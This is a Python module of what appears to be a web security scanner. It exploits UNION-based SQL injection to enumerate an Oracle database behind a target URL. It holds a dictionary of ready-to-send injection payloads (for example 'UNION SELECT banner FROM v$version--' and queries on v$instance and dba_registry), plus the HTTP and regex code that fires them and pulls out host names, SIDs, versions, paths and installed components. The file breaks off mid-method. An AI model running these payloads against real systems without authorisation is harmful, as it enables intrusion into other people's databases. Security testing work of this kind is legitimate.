# app/modules/scanner/oracle_database.py
"""
Oracle database and environment enumeration for SentinelAI.
Phase 6: Oracle Database & Environment Enumeration
"""

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .signatures import OracleSignatures
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class OracleDatabaseResult:
    """
    Oracle database and environment enumeration result.
    Contains comprehensive database information.
    """

    success: bool = False

    # Database identification
    banner: str | None = None
    database_name: str | None = None
    instance_name: str | None = None
    sid: str | None = None
    service_name: str | None = None
    host_name: str | None = None
    global_name: str | None = None
    oracle_home: str | None = None

    # Platform & OS
    platform: str | None = None
    operating_system: str | None = None

    # Version & Edition
    version: str | None = None
    edition: str | None = None
    full_version: str | None = None

    # Database status
    database_role: str | None = None
    open_mode: str | None = None
    log_mode: str | None = None
    startup_time: str | None = None
    uptime: str | None = None
    uptime_seconds: int | None = None

    # Time & Date
    current_date: str | None = None
    current_time: str | None = None
    timezone: str | None = None

    # Character sets
    character_set: str | None = None
    national_character_set: str | None = None

    # NLS parameters
    nls_language: str | None = None
    nls_territory: str | None = None
    nls_parameters: dict[str, str] = field(default_factory=dict)

    # Container/Pluggable
    is_cdb: bool = False
    is_pdb: bool = False
    container_name: str | None = None
    pdb_name: str | None = None

    # Components & Options
    installed_components: list[str] = field(default_factory=list)
    installed_options: list[str] = field(default_factory=list)

    # Raw data for debugging
    raw_responses: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_component(self, component: str):
        """Add an installed component."""
        comp_upper = component.upper().strip()
        if comp_upper and comp_upper not in self.installed_components:
            self.installed_components.append(comp_upper)

    def add_option(self, option: str):
        """Add an installed option."""
        opt_upper = option.upper().strip()
        if opt_upper and opt_upper not in self.installed_options:
            self.installed_options.append(opt_upper)

    def add_nls_parameter(self, name: str, value: str):
        """Add an NLS parameter."""
        if name and value:
            self.nls_parameters[name.upper()] = value

    def get_summary(self) -> str:
        """Get a summary of the database enumeration result."""
        if not self.success:
            return "Database enumeration failed"

        parts = []

        if self.database_name:
            parts.append(f"Database: {self.database_name}")

        if self.instance_name:
            parts.append(f"Instance: {self.instance_name}")

        if self.version:
            parts.append(f"Version: {self.version}")

        if self.edition:
            parts.append(f"Edition: {self.edition}")

        if self.host_name:
            parts.append(f"Host: {self.host_name}")

        if self.database_role:
            parts.append(f"Role: {self.database_role}")

        if self.character_set:
            parts.append(f"Charset: {self.character_set}")

        if self.is_cdb:
            parts.append("CDB")

        if self.installed_components:
            parts.append(f"Components: {len(self.installed_components)}")

        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")

        return f"Database: {', '.join(parts)}" if parts else "Database: No data found"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "banner": self.banner,
            "database_name": self.database_name,
            "instance_name": self.instance_name,
            "sid": self.sid,
            "service_name": self.service_name,
            "host_name": self.host_name,
            "global_name": self.global_name,
            "oracle_home": self.oracle_home,
            "platform": self.platform,
            "operating_system": self.operating_system,
            "version": self.version,
            "edition": self.edition,
            "full_version": self.full_version,
            "database_role": self.database_role,
            "open_mode": self.open_mode,
            "log_mode": self.log_mode,
            "startup_time": self.startup_time,
            "uptime": self.uptime,
            "uptime_seconds": self.uptime_seconds,
            "current_date": self.current_date,
            "current_time": self.current_time,
            "timezone": self.timezone,
            "character_set": self.character_set,
            "national_character_set": self.national_character_set,
            "nls_language": self.nls_language,
            "nls_territory": self.nls_territory,
            "nls_parameters": self.nls_parameters,
            "is_cdb": self.is_cdb,
            "is_pdb": self.is_pdb,
            "container_name": self.container_name,
            "pdb_name": self.pdb_name,
            "installed_components": self.installed_components,
            "installed_options": self.installed_options,
            "errors": self.errors,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Database Enumeration Class
# ============================================================


class OracleDatabaseEnumerator:
    """
    Oracle database and environment enumeration module.
    Phase 6: Enumerates comprehensive database information.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Payloads for database enumeration
    PAYLOADS = {
        "banner": [
            "UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            "UNION SELECT banner FROM v$version--",
        ],
        "database_name": [
            "UNION SELECT name FROM v$database--",
            "UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual--",
        ],
        "instance_name": [
            "UNION SELECT instance_name FROM v$instance--",
            "UNION SELECT SYS_CONTEXT('USERENV','INSTANCE_NAME') FROM dual--",
        ],
        "sid": [
            "UNION SELECT SYS_CONTEXT('USERENV','SID') FROM dual--",
            "UNION SELECT instance_name FROM v$instance--",
        ],
        "service_name": [
            "UNION SELECT SYS_CONTEXT('USERENV','SERVICE_NAME') FROM dual--",
            "UNION SELECT service_name FROM v$services--",
        ],
        "host_name": [
            "UNION SELECT host_name FROM v$instance--",
            "UNION SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual--",
        ],
        "global_name": [
            "UNION SELECT global_name FROM global_name--",
        ],
        "oracle_home": [
            "UNION SELECT SYS_CONTEXT('USERENV','ORACLE_HOME') FROM dual--",
        ],
        "platform": [
            "UNION SELECT platform_name FROM v$database--",
            "UNION SELECT SYS_CONTEXT('USERENV','PLATFORM') FROM dual--",
        ],
        "operating_system": [
            "UNION SELECT SYS_CONTEXT('USERENV','OS_USER') FROM dual--",
        ],
        "version": [
            "UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            "UNION SELECT version FROM v$instance--",
        ],
        "database_role": [
            "UNION SELECT database_role FROM v$database--",
        ],
        "open_mode": [
            "UNION SELECT open_mode FROM v$database--",
        ],
        "log_mode": [
            "UNION SELECT log_mode FROM v$database--",
        ],
        "startup_time": [
            "UNION SELECT startup_time FROM v$instance--",
            "UNION SELECT SYS_CONTEXT('USERENV','STARTUP_TIME') FROM dual--",
        ],
        "uptime": [
            "UNION SELECT ROUND((SYSDATE - STARTUP_TIME) * 24 * 60 * 60) FROM v$instance--",
        ],
        "current_date": [
            "UNION SELECT TO_CHAR(SYSDATE, 'YYYY-MM-DD') FROM dual--",
        ],
        "current_time": [
            "UNION SELECT TO_CHAR(SYSDATE, 'HH24:MI:SS') FROM dual--",
        ],
        "timezone": [
            "UNION SELECT SESSIONTIMEZONE FROM dual--",
            "UNION SELECT DBTIMEZONE FROM dual--",
        ],
        "character_set": [
            "UNION SELECT SYS_CONTEXT('USERENV','NLS_CHARACTERSET') FROM dual--",
            "UNION SELECT value FROM nls_database_parameters WHERE parameter='NLS_CHARACTERSET'--",
        ],
        "national_character_set": [
            "UNION SELECT SYS_CONTEXT('USERENV','NLS_NCHAR_CHARACTERSET') FROM dual--",
        ],
        "nls_language": [
            "UNION SELECT SYS_CONTEXT('USERENV','NLS_LANGUAGE') FROM dual--",
        ],
        "nls_territory": [
            "UNION SELECT SYS_CONTEXT('USERENV','NLS_TERRITORY') FROM dual--",
        ],
        "nls_parameters": [
            "UNION SELECT parameter, value FROM nls_database_parameters--",
        ],
        "cdb_check": [
            "UNION SELECT SYS_CONTEXT('USERENV','CDB_NAME') FROM dual--",
            "UNION SELECT name FROM v$containers WHERE con_id=0--",
        ],
        "pdb_check": [
            "UNION SELECT SYS_CONTEXT('USERENV','PDB_NAME') FROM dual--",
            "UNION SELECT name FROM v$pdbs--",
        ],
        "container_name": [
            "UNION SELECT SYS_CONTEXT('USERENV','CON_NAME') FROM dual--",
        ],
        "components": [
            "UNION SELECT comp_name FROM dba_registry--",
        ],
        "options": [
            "UNION SELECT parameter FROM v$option WHERE value='TRUE'--",
        ],
        "edition": [
            "UNION SELECT banner FROM v$version--",
        ],
        "full_version": [
            "UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
        ],
    }

    # Extraction patterns
    EXTRACTION_PATTERNS = {
        "banner": r"Oracle Database.*",
        "version": r"(\d+\.\d+\.\d+\.\d+\.?\d*)",
        "name": r"[A-Z][A-Z0-9_$]{2,}",
        "host": r"[A-Za-z0-9._-]+",
        "time": r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}",
        "date": r"\d{4}-\d{2}-\d{2}",
        "time_only": r"\d{2}:\d{2}:\d{2}",
        "timezone": r"[+-]\d{2}:\d{2}",
        "charset": r"[A-Z0-9_]+",
        "role": r"(PRIMARY|PHYSICAL STANDBY|LOGICAL STANDBY)",
        "open_mode": r"(READ WRITE|READ ONLY|MOUNTED|OPEN)",
        "log_mode": r"(ARCHIVELOG|NOARCHIVELOG)",
        "component": r"[A-Z][A-Z0-9_$]+",
    }

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle database enumerator.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.signatures = OracleSignatures()

        # State
        self.baseline_response = None
        self.database_result = None

        self.logger.info("[OracleDatabase] Module initialized for database enumeration")
        self.logger.info(f"[OracleDatabase] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleDatabase")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OracleDatabase] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleDatabase] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleDatabase] Failed to get baseline response")

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> requests.Response | None:
        """Send a payload and return the response."""
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _extract_values(self, text: str, pattern: str) -> list[str]:
        """Extract values from text using regex pattern."""
        if not text:
            return []

        # Check for Oracle errors first
        if re.search(r"ORA-\d{5}", text, re.IGNORECASE):
            return []

        matches = re.findall(pattern, text, re.IGNORECASE)
        cleaned = []
        seen = set()

        for m in matches:
            if isinstance(m, tuple):
                for item in m:
                    if item and item.strip():
                        val = item.strip().strip("'\"")
                        if (
                            val
                            and val.upper() not in seen
                            and not re.match(r"^ORA-", val, re.IGNORECASE)
                        ):
                            seen.add(val.upper())
                            cleaned.append(val)
            else:
                val = m.strip().strip("'\"")
                if (
                    val
                    and val.upper() not in seen
                    and not re.match(r"^ORA-", val, re.IGNORECASE)
                ):
                    seen.add(val.upper())
                    cleaned.append(val)

        return cleaned

    def _extract_single_value(self, text: str, pattern: str) -> str | None:
        """Extract a single value from text."""
        values = self._extract_values(text, pattern)
        return values[0] if values else None

    def _clean_value(self, value: str) -> str:
        """Clean extracted value."""
        if not value:
            return value

        value = value.strip()
        value = value.strip("'\"")
        value = value.strip()

        return value

    def _try_payloads(
        self,
        injection_point: str,
        payloads: list[str],
        extract_pattern: str,
        single: bool = False,
    ) -> Any:
        """Try multiple payloads and extract values."""
        for payload in payloads:
            try:
                self.logger.debug(
                    f"[OracleDatabase] Testing payload: {payload[:50]}..."
                )
                response = self._send_payload(injection_point, payload)

                if response and response.text:
                    clean_text = self.html_parser.extract_text(response.text)

                    if single:
                        value = self._extract_single_value(clean_text, extract_pattern)
                        if value:
                            return self._clean_value(value)
                    else:
                        values = self._extract_values(clean_text, extract_pattern)
                        if values:
                            return [self._clean_value(v) for v in values]
            except Exception as e:
                self.logger.warning(f"[OracleDatabase] Payload failed: {e!s}")
                continue

        return None if single else []

    # ============================================================
    # Public Enumeration Methods
    # ============================================================

    def enumerate_banner(self, injection_point: str) -> str | None:
        """Enumerate database banner."""
        self.logger.info("[OracleDatabase] Enumerating database banner...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["banner"],
            self.EXTRACTION_PATTERNS["banner"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Banner found: {result[:100]}... ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate banner ({elapsed:.2f}s)"
            )

        return result

    def enumerate_database_name(self, injection_point: str) -> str | None:
        """Enumerate database name."""
        self.logger.info("[OracleDatabase] Enumerating database name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["database_name"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Database name: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate database name ({elapsed:.2f}s)"
            )

        return result

    def enumerate_instance_name(self, injection_point: str) -> str | None:
        """Enumerate instance name."""
        self.logger.info("[OracleDatabase] Enumerating instance name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["instance_name"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Instance name: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate instance name ({elapsed:.2f}s)"
            )

        return result

    def enumerate_sid(self, injection_point: str) -> str | None:
        """Enumerate SID."""
        self.logger.info("[OracleDatabase] Enumerating SID...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["sid"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] SID: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate SID ({elapsed:.2f}s)"
            )

        return result

    def enumerate_service_name(self, injection_point: str) -> str | None:
        """Enumerate service name."""
        self.logger.info("[OracleDatabase] Enumerating service name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["service_name"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Service name: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate service name ({elapsed:.2f}s)"
            )

        return result

    def enumerate_hostname(self, injection_point: str) -> str | None:
        """Enumerate host name."""
        self.logger.info("[OracleDatabase] Enumerating host name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["host_name"],
            self.EXTRACTION_PATTERNS["host"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Host name: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate host name ({elapsed:.2f}s)"
            )

        return result

    def enumerate_global_name(self, injection_point: str) -> str | None:
        """Enumerate global database name."""
        self.logger.info("[OracleDatabase] Enumerating global name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["global_name"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Global name: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate global name ({elapsed:.2f}s)"
            )

        return result

    def enumerate_oracle_home(self, injection_point: str) -> str | None:
        """Enumerate Oracle Home path."""
        self.logger.info("[OracleDatabase] Enumerating Oracle Home...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["oracle_home"],
            r"[A-Za-z0-9/._-]+",
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Oracle Home: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate Oracle Home ({elapsed:.2f}s)"
            )

        return result

    def enumerate_platform(self, injection_point: str) -> str | None:
        """Enumerate platform."""
        self.logger.info("[OracleDatabase] Enumerating platform...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["platform"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Platform: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate platform ({elapsed:.2f}s)"
            )

        return result

    def enumerate_operating_system(self, injection_point: str) -> str | None:
        """Enumerate operating system."""
        self.logger.info("[OracleDatabase] Enumerating operating system...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["operating_system"],
            r"[A-Za-z0-9_]+",
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Operating system: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate operating system ({elapsed:.2f}s)"
            )

        return result

    def enumerate_version(self, injection_point: str) -> str | None:
        """Enumerate database version."""
        self.logger.info("[OracleDatabase] Enumerating version...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["version"],
            self.EXTRACTION_PATTERNS["version"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Version: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate version ({elapsed:.2f}s)"
            )

        return result

    def enumerate_database_role(self, injection_point: str) -> str | None:
        """Enumerate database role."""
        self.logger.info("[OracleDatabase] Enumerating database role...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["database_role"],
            self.EXTRACTION_PATTERNS["role"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Database role: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate database role ({elapsed:.2f}s)"
            )

        return result

    def enumerate_open_mode(self, injection_point: str) -> str | None:
        """Enumerate open mode."""
        self.logger.info("[OracleDatabase] Enumerating open mode...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["open_mode"],
            self.EXTRACTION_PATTERNS["open_mode"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Open mode: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate open mode ({elapsed:.2f}s)"
            )

        return result

    def enumerate_log_mode(self, injection_point: str) -> str | None:
        """Enumerate log mode."""
        self.logger.info("[OracleDatabase] Enumerating log mode...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["log_mode"],
            self.EXTRACTION_PATTERNS["log_mode"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Log mode: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate log mode ({elapsed:.2f}s)"
            )

        return result

    def enumerate_startup_time(self, injection_point: str) -> str | None:
        """Enumerate startup time."""
        self.logger.info("[OracleDatabase] Enumerating startup time...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["startup_time"],
            self.EXTRACTION_PATTERNS["time"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Startup time: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate startup time ({elapsed:.2f}s)"
            )

        return result

    def enumerate_uptime(self, injection_point: str) -> str | None:
        """Enumerate database uptime."""
        self.logger.info("[OracleDatabase] Enumerating uptime...")
        start = time.time()

        result = self._try_payloads(
            injection_point, self.PAYLOADS["uptime"], r"\d+", single=True
        )

        elapsed = time.time() - start
        if result:
            uptime_sec = int(result)
            uptime_str = f"{uptime_sec // 86400}d {uptime_sec % 86400 // 3600}h {uptime_sec % 3600 // 60}m"
            self.logger.info(f"[OracleDatabase] Uptime: {uptime_str} ({elapsed:.2f}s)")
            return uptime_str
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate uptime ({elapsed:.2f}s)"
            )

        return None

    def enumerate_current_date(self, injection_point: str) -> str | None:
        """Enumerate current date."""
        self.logger.info("[OracleDatabase] Enumerating current date...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_date"],
            self.EXTRACTION_PATTERNS["date"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Current date: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate current date ({elapsed:.2f}s)"
            )

        return result

    def enumerate_current_time(self, injection_point: str) -> str | None:
        """Enumerate current time."""
        self.logger.info("[OracleDatabase] Enumerating current time...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_time"],
            self.EXTRACTION_PATTERNS["time_only"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Current time: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate current time ({elapsed:.2f}s)"
            )

        return result

    def enumerate_timezone(self, injection_point: str) -> str | None:
        """Enumerate timezone."""
        self.logger.info("[OracleDatabase] Enumerating timezone...")
        start = time.time()

        result = self._try_payloads(
            injection_point, self.PAYLOADS["timezone"], r"[A-Za-z0-9/+-]+", single=True
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(f"[OracleDatabase] Timezone: {result} ({elapsed:.2f}s)")
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate timezone ({elapsed:.2f}s)"
            )

        return result

    def enumerate_character_set(self, injection_point: str) -> str | None:
        """Enumerate character set."""
        self.logger.info("[OracleDatabase] Enumerating character set...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["character_set"],
            self.EXTRACTION_PATTERNS["charset"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] Character set: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate character set ({elapsed:.2f}s)"
            )

        return result

    def enumerate_national_character_set(self, injection_point: str) -> str | None:
        """Enumerate national character set."""
        self.logger.info("[OracleDatabase] Enumerating national character set...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["national_character_set"],
            self.EXTRACTION_PATTERNS["charset"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] National character set: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate national character set ({elapsed:.2f}s)"
            )

        return result

    def enumerate_nls_language(self, injection_point: str) -> str | None:
        """Enumerate NLS language."""
        self.logger.info("[OracleDatabase] Enumerating NLS language...")
        start = time.time()

        result = self._try_payloads(
            injection_point, self.PAYLOADS["nls_language"], r"[A-Z]+", single=True
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] NLS language: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate NLS language ({elapsed:.2f}s)"
            )

        return result

    def enumerate_nls_territory(self, injection_point: str) -> str | None:
        """Enumerate NLS territory."""
        self.logger.info("[OracleDatabase] Enumerating NLS territory...")
        start = time.time()

        result = self._try_payloads(
            injection_point, self.PAYLOADS["nls_territory"], r"[A-Z]+", single=True
        )

        elapsed = time.time() - start
        if result:
            self.logger.info(
                f"[OracleDatabase] NLS territory: {result} ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate NLS territory ({elapsed:.2f}s)"
            )

        return result

    def enumerate_nls_parameters(self, injection_point: str) -> dict[str, str]:
        """Enumerate NLS parameters."""
        self.logger.info("[OracleDatabase] Enumerating NLS parameters...")
        start = time.time()

        params = {}
        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["nls_parameters"],
            r"([A-Z_]+)\s+([A-Z0-9_]+)",
            single=False,
        )

        elapsed = time.time() - start

        if result:
            for item in result:
                if " " in item:
                    parts = item.split()
                    if len(parts) >= 2:
                        params[parts[0]] = parts[1]
            self.logger.info(
                f"[OracleDatabase] Found {len(params)} NLS parameters ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate NLS parameters ({elapsed:.2f}s)"
            )

        return params

    def enumerate_cdb(self, injection_point: str) -> bool:
        """Check if database is a Container Database (CDB)."""
        self.logger.info("[OracleDatabase] Checking CDB status...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["cdb_check"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start

        # Check if result is a valid CDB name
        is_cdb = False
        if result:
            result_upper = result.upper()
            # Valid CDB names must contain "CDB" or be "ROOT"
            if (
                "CDB" in result_upper
                or result_upper == "ROOT"
                or result_upper in ["PDB$SEED", "PDB"]
            ):
                is_cdb = True
            # Check if it's a valid database name (not an error or random word)
            elif (
                len(result) >= 3
                and result_upper not in ["NO", "DATA", "NULL", "NONE", "ORA"]
                and not result_upper.startswith("ORA-")
            ):
                # This might be a CDB name, but we're not sure - return False to be safe
                is_cdb = False

        self.logger.info(f"[OracleDatabase] CDB: {is_cdb} ({elapsed:.2f}s)")
        return is_cdb

    def enumerate_pdb(self, injection_point: str) -> str | None:
        """Enumerate Pluggable Database (PDB) name."""
        self.logger.info("[OracleDatabase] Enumerating PDB name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["pdb_check"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            result_upper = result.upper()
            # Only return if it looks like a valid PDB name
            if (
                len(result) >= 3
                and result_upper not in ["NO", "DATA", "NULL", "NONE", "ORA"]
                and not result_upper.startswith("ORA-")
            ):
                self.logger.info(f"[OracleDatabase] PDB: {result} ({elapsed:.2f}s)")
                return result

        self.logger.warning(
            f"[OracleDatabase] Failed to enumerate PDB ({elapsed:.2f}s)"
        )
        return None

    def enumerate_container_name(self, injection_point: str) -> str | None:
        """Enumerate container name."""
        self.logger.info("[OracleDatabase] Enumerating container name...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["container_name"],
            self.EXTRACTION_PATTERNS["name"],
            single=True,
        )

        elapsed = time.time() - start
        if result:
            result_upper = result.upper()
            # Only return if it looks like a valid container name
            if (
                len(result) >= 3
                and result_upper not in ["NO", "DATA", "NULL", "NONE", "ORA"]
                and not result_upper.startswith("ORA-")
            ):
                self.logger.info(
                    f"[OracleDatabase] Container name: {result} ({elapsed:.2f}s)"
                )
                return result

        self.logger.warning(
            f"[OracleDatabase] Failed to enumerate container name ({elapsed:.2f}s)"
        )
        return None

    def enumerate_components(self, injection_point: str) -> list[str]:
        """Enumerate installed components."""
        self.logger.info("[OracleDatabase] Enumerating installed components...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["components"],
            self.EXTRACTION_PATTERNS["component"],
            single=False,
        )

        elapsed = time.time() - start
        if result:
            # Filter out error messages
            result = [r for r in result if not re.match(r"^ORA-", r, re.IGNORECASE)]
            self.logger.info(
                f"[OracleDatabase] Found {len(result)} components ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate components ({elapsed:.2f}s)"
            )

        return result or []

    def enumerate_options(self, injection_point: str) -> list[str]:
        """Enumerate installed options."""
        self.logger.info("[OracleDatabase] Enumerating installed options...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["options"],
            self.EXTRACTION_PATTERNS["component"],
            single=False,
        )

        elapsed = time.time() - start
        if result:
            # Filter out error messages
            result = [r for r in result if not re.match(r"^ORA-", r, re.IGNORECASE)]
            self.logger.info(
                f"[OracleDatabase] Found {len(result)} options ({elapsed:.2f}s)"
            )
        else:
            self.logger.warning(
                f"[OracleDatabase] Failed to enumerate options ({elapsed:.2f}s)"
            )

        return result or []

    def enumerate_edition(self, injection_point: str) -> str | None:
        """Enumerate database edition from banner."""
        self.logger.info("[OracleDatabase] Enumerating edition...")
        start = time.time()

        banner = self._try_payloads(
            injection_point,
            self.PAYLOADS["edition"],
            r"(Enterprise|Standard|Express|Personal|Lite) Edition",
            single=True,
        )

        elapsed = time.time() - start
        if banner:
            # Extract edition from banner
            match = re.search(
                r"(Enterprise|Standard|Express|Personal|Lite) Edition",
                banner,
                re.IGNORECASE,
            )
            if match:
                edition = match.group(1) + " Edition"
                self.logger.info(
                    f"[OracleDatabase] Edition: {edition} ({elapsed:.2f}s)"
                )
                return edition

        self.logger.warning(
            f"[OracleDatabase] Failed to enumerate edition ({elapsed:.2f}s)"
        )
        return None

    def enumerate_full_version(self, injection_point: str) -> str | None:
        """Enumerate full version string."""
        self.logger.info("[OracleDatabase] Enumerating full version...")
        start = time.time()

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["full_version"],
            r"Oracle Database.*",
            single=True,
        )

        elapsed = time.time() - start
        if result:
